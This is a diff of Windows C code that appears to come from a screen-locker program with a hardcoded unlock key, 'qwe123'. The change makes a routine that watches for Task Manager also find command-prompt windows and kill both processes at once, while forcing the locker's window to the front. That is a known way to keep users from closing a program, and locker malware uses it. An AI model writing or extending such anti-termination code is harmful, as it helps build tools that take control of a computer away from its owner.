@@ -16,6 +16,7 @@ HWND hwndEdit = NULL;
 HWND hwndTaskbar=NULL;
 HWND hwnd=NULL;
 HWND taskmgrWnd=NULL;
+HWND cmdWnd=NULL;
 int screen_width=0;
 int screen_height=0;
 
@@ -23,8 +24,11 @@ char miYao[]="qwe123";
 int isLook=1;
 int isWrong=0;
 
-BOOL KillProcess(DWORD processId)
+BOOL KillProcess(HWND hwnd)
 {
+    if(!hwnd) return FALSE;
+    DWORD processId;
+    GetWindowThreadProcessId(hwnd, &processId);
     HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
     if (hProcess == NULL)
     {
@@ -37,28 +41,20 @@ BOOL KillProcess(DWORD processId)
     return result;
 }
 
-// 隐藏任务管理器窗口
-BOOL KillTaskmgr()
+// 隐藏任务管理器窗口/cmd
+void KillTaskmgr()
 {
     // 查找任务管理器窗口句柄
     taskmgrWnd = FindWindowA("TaskManagerWindow", NULL);
-    if (taskmgrWnd)
+    cmdWnd = FindWindowA("ConsoleWindowClass", NULL);
+    if (taskmgrWnd||cmdWnd)
     {
         SetForegroundWindow(hwnd);
         // ShowWindow(taskmgrWnd, SW_MINIMIZE);
-        DWORD processId;
-        GetWindowThreadProcessId(taskmgrWnd, &processId);
 
         // 通过pid进行删除
-        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
-        if (hProcess == NULL)
-        {
-            return FALSE;
-        }
-
-        BOOL result = TerminateProcess(hProcess, 0); // 立即终止进程
-        CloseHandle(hProcess);
-        return TRUE;
+        KillProcess(taskmgrWnd);
+        KillProcess(cmdWnd);
 
     }
 }
